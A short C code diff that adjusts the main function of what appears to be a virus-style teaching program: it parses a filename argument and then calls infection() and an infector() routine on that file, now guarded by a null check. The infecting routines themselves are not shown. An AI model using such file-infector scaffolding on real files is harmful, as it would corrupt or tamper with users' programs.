@@ -24,11 +24,14 @@ int main(int argc, char *argv[], char *envp[])
             filename = argv[i] + 2;
             system_call(SYS_WRITE, STDOUT, filename, strlen(filename));
             system_call(SYS_WRITE, STDOUT, "\n", 1);
+            break;
         }
     }
 
     infection();
-    infector(filename);
+
+    if (filename)
+        infector(filename);
 
     return 0;
 }
